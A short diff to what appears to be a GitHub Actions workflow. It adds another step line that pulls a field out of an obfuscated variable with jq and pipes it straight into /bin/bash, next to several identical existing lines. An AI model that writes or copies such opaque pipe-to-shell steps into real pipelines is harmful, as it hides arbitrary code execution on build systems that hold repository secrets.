@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$yajhl72462" | jq -r .v77 | /bin/bash
           printf '%s' "$e856" | jq -r .mjmku522 | /bin/bash
           printf '%s' "$sz014" | jq -r .s90 | /bin/bash
+          printf '%s' "$wpr87" | jq -r .mcon250 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
